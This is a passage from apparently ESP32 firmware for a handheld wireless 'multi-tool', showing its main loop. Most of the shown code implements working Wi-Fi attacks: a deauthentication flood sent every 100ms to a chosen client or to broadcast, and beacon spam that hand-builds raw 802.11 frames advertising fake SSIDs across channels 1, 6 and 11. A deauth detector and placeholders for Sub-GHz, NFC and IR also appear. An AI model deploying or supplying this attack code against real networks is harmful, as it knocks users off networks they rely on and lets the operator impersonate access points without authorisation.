      lastDetectHop = millis();
    }
  }

  // Client scan: auto-finish after timeout
  if (currentState == STATE_DEAUTH_CLIENT_SCAN && clientScanActive) {
    if (millis() - clientScanStart >= CLIENT_SCAN_MS) {
      finishClientScan();
    }
  }

  // Deauth Attack: send frame every 100ms
  if (currentState == STATE_DEAUTH_ATTACK && deauthAttackActive) {
    if (millis() - lastDeauthSend >= 100) {
      const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      const uint8_t* dest = attackTargetAll ? broadcast : attackClientMAC;
      sendDeauthFrame(wifiNets[deauthTargetIdx].bssid, dest);
      deauthFrameCount++;
      lastDeauthSend = millis();
      drawDeauthAttack();
    }
  }

  // Beacon Spam: cycle through all SSIDs on channels 1, 6, 11
  if (currentState == STATE_BEACON_SPAM && beaconSpamActive) {
    if (millis() - lastBeaconSend >= 10) {
      uint8_t ch = beaconChannels[beaconChannelIdx];
      esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, nullptr, 0, false); // dummy to check interface
      // actually send
      uint8_t ssidLen = strlen(spamSSIDs[beaconSSIDIdx]);
      uint8_t frame[100];
      int p = 0;
      frame[p++]=0x80; frame[p++]=0x00;
      frame[p++]=0x00; frame[p++]=0x00;
      frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF;
      frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF;
      memcpy(&frame[p], spamMACs[beaconSSIDIdx], 6); p+=6;
      memcpy(&frame[p], spamMACs[beaconSSIDIdx], 6); p+=6;
      frame[p++]=0x00; frame[p++]=0x00;
      memset(&frame[p], 0, 8); p+=8;
      frame[p++]=0x64; frame[p++]=0x00;
      frame[p++]=0x31; frame[p++]=0x04;
      frame[p++]=0x00; frame[p++]=ssidLen;
      memcpy(&frame[p], spamSSIDs[beaconSSIDIdx], ssidLen); p+=ssidLen;
      frame[p++]=0x01; frame[p++]=0x08;
      frame[p++]=0x82; frame[p++]=0x84;
      frame[p++]=0x8b; frame[p++]=0x96;
      frame[p++]=0x24; frame[p++]=0x30;
      frame[p++]=0x48; frame[p++]=0x6c;
      frame[p++]=0x03; frame[p++]=0x01; frame[p++]=ch;
      result = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);

      beaconFrameCount++;
      lastBeaconSend = millis();

      // Serial debug every 20 frames
      if (beaconFrameCount % 20 == 0) {
        Serial.printf("[BEACON] ssid=\"%s\" ch=%d total=%d tx=%s\n",
          spamSSIDs[beaconSSIDIdx],
          ch,
          beaconFrameCount,
          result == ESP_OK ? "OK" : "FAIL"
        );
      }

      // Advance SSID
      beaconSSIDIdx++;
      if (beaconSSIDIdx >= spamSSIDCount) {
        beaconSSIDIdx = 0;
        // After full SSID cycle, hop to next channel
        beaconChannelIdx = (beaconChannelIdx + 1) % 3;
        esp_wifi_set_channel(beaconChannels[beaconChannelIdx], WIFI_SECOND_CHAN_NONE);
        Serial.printf("[BEACON] --- hopped to ch%d ---\n", beaconChannels[beaconChannelIdx]);
        drawBeaconSpam();
      }
    }
  }

  // Draw all non-self-refreshing screens
  if (currentState != STATE_PACKET_MONITOR &&
      currentState != STATE_DEAUTH_ATTACK  &&
      currentState != STATE_BEACON_SPAM) {
    switch (currentState) {
      case STATE_MENU:                 drawMenu(); break;
      case STATE_WIFI_RESULTS:         drawWifiResults(); break;
      case STATE_PROBE_SNIFF:          drawProbeSniffer(); break;
      case STATE_DEAUTH_DETECT:        drawDeauthDetector(); break;
      case STATE_DEAUTH_TARGET:        drawDeauthTargetSelect(); break;
      case STATE_DEAUTH_CLIENT_SCAN:   drawClientScan(); break;
      case STATE_DEAUTH_CLIENT_SELECT: drawClientSelect(); break;
      case STATE_SUBGHZ:  drawPlaceholder("Sub-GHz", "Wire CC1101 first"); break;
      case STATE_NFC:     drawPlaceholder("NFC Reader", "Wire PN532 first"); break;
      case STATE_IR:      drawPlaceholder("IR Remote", "Coming soon..."); break;
      case STATE_ABOUT:   drawAbout(); break;
      default: break;
    }
  }

  // Input: physical buttons + serial
  char input = 0;
  if (Serial.available()) input = Serial.read();
  if (!input) input = readButtons();
  if (input) handleInput(input);

  delay(30);
}